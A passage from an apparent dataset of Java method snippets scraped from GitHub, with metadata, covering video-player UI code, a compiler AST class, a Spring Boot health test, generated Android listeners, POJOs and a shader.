mSourcePosition;\n        sampleVideo.mType = mType;\n        sampleVideo.mTransformSize = mTransformSize;\n        sampleVideo.mUrlList = mUrlList;\n        sampleVideo.mTypeText = mTypeText;\n        //sampleVideo.resolveTransform();\n        sampleVideo.resolveTypeUI();\n        //sampleVideo.resolveRotateUI();\n        //\u8fd9\u4e2a\u64ad\u653e\u5668\u7684demo\u914d\u7f6e\u5207\u6362\u5230\u5168\u5c4f\u64ad\u653e\u5668\n        //\u8fd9\u53ea\u662f\u5355\u7eaf\u7684\u4f5c\u4e3a\u5168\u5c4f\u64ad\u653e\u663e\u793a\uff0c\u5982\u679c\u9700\u8981\u505a\u5927\u5c0f\u5c4f\u5e55\u5207\u6362\uff0c\u8bf7\u8bb0\u5f97\u5728\u8fd9\u91cc\u8036\u8bbe\u7f6e\u4e0a\u89c6\u9891\u5168\u5c4f\u7684\u9700\u8981\u7684\u81ea\u5b9a\u4e49\u914d\u7f6e\n        //\u6bd4\u5982\u5df2\u65cb\u8f6c\u89d2\u5ea6\u4e4b\u7c7b\u7684\u7b49\u7b49\n        //\u53ef\u53c2\u8003super\u4e2d\u7684\u5b9e\u73b0\n        return sampleVideo;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/video/SampleVideo.java", "stars": "2", "class_props": {"extends": "StandardGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 31206, "method_name": "resolveNormalVideoShow", "class_name": "SampleVideo", "params": ["View", "ViewGroup", "GSYVideoPlayer"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void resolveNormalVideoShow(View oldF, ViewGroup vp, GSYVideoPlayer gsyVideoPlayer) {\n        super.resolveNormalVideoShow(oldF, vp, gsyVideoPlayer);\n        if (gsyVideoPlayer != null) {\n            SampleVideo sampleVideo = (SampleVideo) gsyVideoPlayer;\n            mSourcePosition = sampleVideo.mSourcePosition;\n            mType = sampleVideo.mType;\n            mTransformSize = sampleVideo.mTransformSize;\n            mTypeText = sampleVideo.mTypeText;\n            setUp(mUrlList, mCache, mCachePath, mTitle);\n            resolveTypeUI();\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/video/SampleVideo.java", "stars": "2", "class_props": {"extends": "StandardGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 31207, "method_name": "resolveRotateUI", "class_name": "SampleVideo", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void resolveRotateUI() {\n        if (!mHadPlay) {\n            return;\n        }\n        mTextureView.setRotation(mRotate);\n        mTextureView.requestLayout();\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/video/SampleVideo.java", "stars": "2", "class_props": {"extends": "StandardGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 31208, "method_name": "resolveTypeUI", "class_name": "SampleVideo", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void resolveTypeUI() {\n        if (!mHadPlay) {\n            return;\n        }\n        if (mType == 1) {\n            mMoreScale.setText(\"16:9\");\n            GSYVideoType.setShowType(GSYVideoType.SCREEN_TYPE_16_9);\n        } else if (mType == 2) {\n            mMoreScale.setText(\"4:3\");\n            GSYVideoType.setShowType(GSYVideoType.SCREEN_TYPE_4_3);\n        } else if (mType == 3) {\n            mMoreScale.setText(\"\u5168\u5c4f\");\n            GSYVideoType.setShowType(GSYVideoType.SCREEN_TYPE_FULL);\n        } else if (mType == 4) {\n            mMoreScale.setText(\"\u62c9\u4f38\u5168\u5c4f\");\n            GSYVideoType.setShowType(GSYVideoType.SCREEN_MATCH_FULL);\n        } else if (mType == 0) {\n            mMoreScale.setText(\"\u9ed8\u8ba4\u6bd4\u4f8b\");\n            GSYVideoType.setShowType(GSYVideoType.SCREEN_TYPE_DEFAULT);\n        }\n        changeTextureViewShowType();\n        if (mTextureView != null)\n            mTextureView.requestLayout();\n        mSwitchSize.setText(mTypeText);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/video/SampleVideo.java", "stars": "2", "class_props": {"extends": "StandardGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 31209, "method_name": "showSwitchDialog", "class_name": "SampleVideo", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void showSwitchDialog() {\n        if (!mHadPlay) {\n            return;\n        }\n        SwitchVideoTypeDialog switchVideoTypeDialog = new SwitchVideoTypeDialog(getContext());\n        switchVideoTypeDialog.initList(mUrlList, new SwitchVideoTypeDialog.OnListItemClickListener() {\n            @Override\n            public void onItemClick(int position) {\n                final String name = mUrlList.get(position).getName();\n                if (mSourcePosition != position) {\n                    if ((mCurrentState == GSYVideoPlayer.CURRENT_STATE_PLAYING\n                            || mCurrentState == GSYVideoPlayer.CURRENT_STATE_PAUSE)) {\n                        final String url = mUrlList.get(position).getUrl();\n                        onVideoPause();\n                        final long currentPosition = mCurrentPosition;\n                        getGSYVideoManager().releaseMediaPlayer();\n                        cancelProgressTimer();\n                        hideAllWidget();\n                        new Handler().postDelayed(new Runnable() {\n                            @Override\n                            public void run() {\n                                setUp(url, mCache, mCachePath, mTitle);\n                                setSeekOnStart(currentPosition);\n                                startPlayLogic();\n                                cancelProgressTimer();\n                                hideAllWidget();\n                            }\n                        }, 500);\n                        mTypeText = name;\n                        mSwitchSize.setText(name);\n                        mSourcePosition = position;\n                    }\n                } else {\n                    Toast.makeText(getContext(), \"\u5df2\u7ecf\u662f \" + name, Toast.LENGTH_LONG).show();\n                }\n            }\n        });\n        switchVideoTypeDialog.show();\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/video/SampleVideo.java", "stars": "2", "class_props": {"extends": "StandardGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 31210, "method_name": "checkType", "class_name": "Expr", "params": [], "throws": ["TypeException"], "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "\tpublic abstract void checkType() throws TypeException;\n\tpublic abstract Object constEval(Environment<ExprVALUE> const_environment) throws EnvironmentException, TypeException;\n\n\tpublic Type getType() {\n\t\treturn type;\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/Expr.java", "stars": "3", "class_props": {"extends": "Code", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 31211, "method_name": "constEval", "class_name": "Expr", "params": ["Environment<ExprVALUE>"], "throws": ["EnvironmentException", "TypeException"], "modifiers": ["public", "abstract"], "return_type": "Object", "snippet": "\tpublic abstract Object constEval(Environment<ExprVALUE> const_environment) throws EnvironmentException, TypeException;\n\n\tpublic Type getType() {\n\t\treturn type;\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/Expr.java", "stars": "3", "class_props": {"extends": "Code", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 31212, "method_name": "getType", "class_name": "Expr", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Type", "snippet": "\tpublic Type getType() {\n\t\treturn type;\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/Expr.java", "stars": "3", "class_props": {"extends": "Code", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 31213, "method_name": "getTypeCode", "class_name": "Expr", "params": [], "throws": null, "modifiers": ["public"], "return_type": "TypeCode", "snippet": "\tpublic TypeCode getTypeCode() {\n\t\treturn type.getTypeCode();\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/Expr.java", "stars": "3", "class_props": {"extends": "Code", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 31214, "method_name": "getSize", "class_name": "Expr", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int getSize() {\n\t\treturn type.getSize();\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/Expr.java", "stars": "3", "class_props": {"extends": "Code", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 31215, "method_name": "setType", "class_name": "Expr", "params": ["Type"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setType(Type type) {\n\t\tthis.type = type;\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/Expr.java", "stars": "3", "class_props": {"extends": "Code", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 31216, "method_name": "indent", "class_name": "Expr", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void indent() {\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/Expr.java", "stars": "3", "class_props": {"extends": "Code", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 31217, "method_name": "isVARIABLE", "class_name": "Expr", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "boolean", "snippet": "\tprotected boolean isVARIABLE() {\n\t\treturn this instanceof ExprVARIABLE;\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/Expr.java", "stars": "3", "class_props": {"extends": "Code", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 31218, "method_name": "isPOINTER", "class_name": "Expr", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean isPOINTER() {\n\t\treturn this instanceof ExprPOINTER;\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/Expr.java", "stars": "3", "class_props": {"extends": "Code", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 31219, "method_name": "isADRESS", "class_name": "Expr", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean isADRESS() {\n\t\treturn this instanceof ExprADDRESS;\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/Expr.java", "stars": "3", "class_props": {"extends": "Code", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 31220, "method_name": "isDOT", "class_name": "Expr", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean isDOT() {\n\t\treturn this instanceof ExprDOT;\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/Expr.java", "stars": "3", "class_props": {"extends": "Code", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 31221, "method_name": "isARRAY", "class_name": "Expr", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean isARRAY() {\n\t\treturn this instanceof ExprARRAY;\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/Expr.java", "stars": "3", "class_props": {"extends": "Code", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 31222, "method_name": "isVALUE", "class_name": "Expr", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean isVALUE() {\n\t\treturn this instanceof ExprVALUE;\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/Expr.java", "stars": "3", "class_props": {"extends": "Code", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 31223, "method_name": "isOP", "class_name": "Expr", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "boolean", "snippet": "\tprotected boolean isOP() {\n\t\treturn this instanceof ExprPLUS\n\t\t\t\t|| this instanceof ExprMINUS\n\t\t\t\t|| this instanceof ExprMUL\n\t\t\t\t|| this instanceof ExprDIV\n\t\t\t\t|| this instanceof ExprMOD\n\t\t\t\t|| this instanceof ExprUMINUS\n\t\t\t\t|| this instanceof ExprAND\n\t\t\t\t|| this instanceof ExprOR\n\t\t\t\t|| this instanceof ExprNOT\n\t\t\t\t|| this instanceof ExprLT\n\t\t\t\t|| this instanceof ExprLE\n\t\t\t\t|| this instanceof ExprGT\n\t\t\t\t|| this instanceof ExprGE\n\t\t\t\t|| this instanceof ExprEQ\n\t\t\t\t|| this instanceof ExprNE;\n\t\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/Expr.java", "stars": "3", "class_props": {"extends": "Code", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 31224, "method_name": "generateCode", "class_name": "Expr", "params": [], "throws": ["CodeException"], "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String generateCode() throws CodeException {\n\t\t// Produit un commentaire sommaire pour rappeler\n\t\t// l'expression du langage L\u00e9a\n\t\treturn NL + tab() + \"/* \" + this.toString() + \" */\" + NL;\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/Expr.java", "stars": "3", "class_props": {"extends": "Code", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 31225, "method_name": "testHealth", "class_name": "ManagementPortWithLazyInitializationTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid testHealth() {\n\t\tResponseEntity<String> entity = new TestRestTemplate().withBasicAuth(\"user\", \"password\")\n\t\t\t\t.getForEntity(\"http://localhost:\" + this.managementPort + \"/actuator/health\", String.class);\n\t\tassertThat(entity.getStatusCode()).isEqualTo(HttpStatus.OK);\n\t\tassertThat(entity.getBody()).contains(\"\\\"status\\\":\\\"UP\\\"\");\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-actuator/src/test/java/smoketest/actuator/ManagementPortWithLazyInitializationTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 31226, "method_name": "onTransitionCancel", "class_name": "Transition_TransitionListenerImplementor", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onTransitionCancel (android.support.transition.Transition p0)\n\t{\n\t\tn_onTransitionCancel (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/transition/Transition_TransitionListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 31227, "method_name": "n_onTransitionCancel", "class_name": "Transition_TransitionListenerImplementor", "params": ["android"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onTransitionCancel (android.support.transition.Transition p0);\n\n\n\tpublic void onTransitionEnd (android.support.transition.Transition p0)\n\t{\n\t\tn_onTransitionEnd (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/transition/Transition_TransitionListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 31228, "method_name": "onTransitionEnd", "class_name": "Transition_TransitionListenerImplementor", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onTransitionEnd (android.support.transition.Transition p0)\n\t{\n\t\tn_onTransitionEnd (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/transition/Transition_TransitionListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 31229, "method_name": "n_onTransitionEnd", "class_name": "Transition_TransitionListenerImplementor", "params": ["android"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onTransitionEnd (android.support.transition.Transition p0);\n\n\n\tpublic void onTransitionPause (android.support.transition.Transition p0)\n\t{\n\t\tn_onTransitionPause (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/transition/Transition_TransitionListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 31230, "method_name": "onTransitionPause", "class_name": "Transition_TransitionListenerImplementor", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onTransitionPause (android.support.transition.Transition p0)\n\t{\n\t\tn_onTransitionPause (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/transition/Transition_TransitionListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 31231, "method_name": "n_onTransitionPause", "class_name": "Transition_TransitionListenerImplementor", "params": ["android"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onTransitionPause (android.support.transition.Transition p0);\n\n\n\tpublic void onTransitionResume (android.support.transition.Transition p0)\n\t{\n\t\tn_onTransitionResume (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/transition/Transition_TransitionListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 31232, "method_name": "onTransitionResume", "class_name": "Transition_TransitionListenerImplementor", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onTransitionResume (android.support.transition.Transition p0)\n\t{\n\t\tn_onTransitionResume (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/transition/Transition_TransitionListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 31233, "method_name": "n_onTransitionResume", "class_name": "Transition_TransitionListenerImplementor", "params": ["android"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onTransitionResume (android.support.transition.Transition p0);\n\n\n\tpublic void onTransitionStart (android.support.transition.Transition p0)\n\t{\n\t\tn_onTransitionStart (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/transition/Transition_TransitionListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 31234, "method_name": "onTransitionStart", "class_name": "Transition_TransitionListenerImplementor", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onTransitionStart (android.support.transition.Transition p0)\n\t{\n\t\tn_onTransitionStart (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/transition/Transition_TransitionListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 31235, "method_name": "n_onTransitionStart", "class_name": "Transition_TransitionListenerImplementor", "params": ["android"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onTransitionStart (android.support.transition.Transition p0);\n\n\tprivate java.util.ArrayList refList;\n\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/transition/Transition_TransitionListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 31236, "method_name": "monodroidAddReference", "class_name": "Transition_TransitionListenerImplementor", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/transition/Transition_TransitionListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 31237, "method_name": "monodroidClearReferences", "class_name": "Transition_TransitionListenerImplementor", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\n\t{\n\t\tif (refList != null)\n\t\t\trefList.clear ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/transition/Transition_TransitionListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 31238, "method_name": "main", "class_name": "DemoLock", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        //\u521b\u5efa Runnable \u63a5\u53e3\u7684\u5b9e\u73b0\u7c7b\u5bf9\u8c61\n        Lockmpl run = new Lockmpl();\n        //\u521b\u5efaThread\u7c7b\u5bf9\u8c61\uff0c\u6784\u9020\u65b9\u6cd5\u4e2d\u4f20\u9012Runnable\u63a5\u53e3\u7684\u5b9e\u73b0\u7c7b\u5bf9\u8c61\n        Thread t0 = new Thread(run);\n        Thread t1 = new Thread(run);\n        Thread t2 = new Thread(run);\n        //\u8c03\u7528start\u65b9\u6cd5\u5f00\u542f\u591a\u7ebf\u7a0b\n        t0.start();\n        t1.start();\n        t2.start();\n    }", "url": "https://raw.githubusercontent.com/chengcheng1021/javaStudy/master/src/java2/Lock/DemoLock.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31239, "method_name": "getHeader", "class_name": "CountyCaseData", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getHeader() {\n        return header;\n    }", "url": "https://raw.githubusercontent.com/RzTutul/Covid-19/master/app/src/main/java/com/example/covid19/pojo/CountyCaseData.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31240, "method_name": "setHeader", "class_name": "CountyCaseData", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setHeader(String header) {\n        this.header = header;\n    }", "url": "https://raw.githubusercontent.com/RzTutul/Covid-19/master/app/src/main/java/com/example/covid19/pojo/CountyCaseData.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31241, "method_name": "getValue", "class_name": "CountyCaseData", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getValue() {\n        return value;\n    }", "url": "https://raw.githubusercontent.com/RzTutul/Covid-19/master/app/src/main/java/com/example/covid19/pojo/CountyCaseData.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31242, "method_name": "setValue", "class_name": "CountyCaseData", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setValue(String value) {\n        this.value = value;\n    }", "url": "https://raw.githubusercontent.com/RzTutul/Covid-19/master/app/src/main/java/com/example/covid19/pojo/CountyCaseData.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31243, "method_name": "getColor", "class_name": "CountyCaseData", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getColor() {\n        return color;\n    }", "url": "https://raw.githubusercontent.com/RzTutul/Covid-19/master/app/src/main/java/com/example/covid19/pojo/CountyCaseData.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31244, "method_name": "setColor", "class_name": "CountyCaseData", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setColor(String color) {\n        this.color = color;\n    }", "url": "https://raw.githubusercontent.com/RzTutul/Covid-19/master/app/src/main/java/com/example/covid19/pojo/CountyCaseData.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31245, "method_name": "getImageId", "class_name": "RowItem", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getImageId() {\n        return imageId;\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/customlistviewBaseAdapter/src/com/example/customlistviewbaseadapter/RowItem.java", "stars": "74", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31246, "method_name": "setImageId", "class_name": "RowItem", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setImageId(int imageId) {\n        this.imageId = imageId;\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/customlistviewBaseAdapter/src/com/example/customlistviewbaseadapter/RowItem.java", "stars": "74", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31247, "method_name": "getDesc", "class_name": "RowItem", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getDesc() {\n        return desc;\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/customlistviewBaseAdapter/src/com/example/customlistviewbaseadapter/RowItem.java", "stars": "74", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31248, "method_name": "setDesc", "class_name": "RowItem", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDesc(String desc) {\n        this.desc = desc;\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/customlistviewBaseAdapter/src/com/example/customlistviewbaseadapter/RowItem.java", "stars": "74", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31249, "method_name": "getTitle", "class_name": "RowItem", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getTitle() {\n        return title;\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/customlistviewBaseAdapter/src/com/example/customlistviewbaseadapter/RowItem.java", "stars": "74", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31250, "method_name": "setTitle", "class_name": "RowItem", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setTitle(String title) {\n        this.title = title;\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/customlistviewBaseAdapter/src/com/example/customlistviewbaseadapter/RowItem.java", "stars": "74", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31251, "method_name": "toString", "class_name": "RowItem", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String toString() {\n        return title + \"\\n\" + desc;\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/customlistviewBaseAdapter/src/com/example/customlistviewbaseadapter/RowItem.java", "stars": "74", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31252, "method_name": "getShader", "class_name": "GammaEffect", "params": ["GLSurfaceView"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getShader(GLSurfaceView mGlSurfaceView) {\n\n        String shader = \"#extension GL_OES_EGL_image_external : require\\n\"\n                + \"precision mediump float;\\n\"\n\n                + \"varying vec2 vTextureCoord;\\n\"\n                + \"uniform samplerExternalOES sTexture;\\n\"\n                + \"float gamma=\" + gammaValue + \";\\n\"\n\n                + \"void main() {\\n\"\n\n                + \"vec4 textureColor = texture2D(sTexture, vTextureCoord);\\n\"\n                + \"gl_FragColor = vec4(pow(textureColor.rgb, vec3(gamma)), textureColor.w);\\n\"\n\n                + \"}\\n\";\n\n        return shader;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/effect/GammaEffect.java", "stars": "2", "class_props": {"extends": null, "implements": ["ShaderInterface"], "modifiers": ["public"]}}, {"id": 31253, "method_name": "injectCBTPack", "class_name": "ReloadableResourceManagerImplMixin", "params": ["Executor", "Executor", "CompletableFuture<Unit>", "List<ResourcePack>", "CallbackInfoReturnable<ResourceReloadMonitor>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "\tprivate void injectCBTPack(Executor prepareExecutor, Executor applyExecutor, CompletableFuture<Unit> initialStage, List<ResourcePack> packs, CallbackInfoReturnable<ResourceReloadMonitor> cir) {\n\t\tConnectedBlockTextures.RESOURCE_PACK_PRIORITY_MAP.clear();\n\t\tfor(int i = 0; i < packs.size(); i++) {\n\t\t\tSystem.out.println(i + \" \" + packs.get(i).getName());\n\t\t\tConnectedBlockTextures.RESOURCE_PACK_PRIORITY_MAP.put(packs.get(i).getName(), i);\n\t\t}\n\t\tSystem.out.println(\"sans 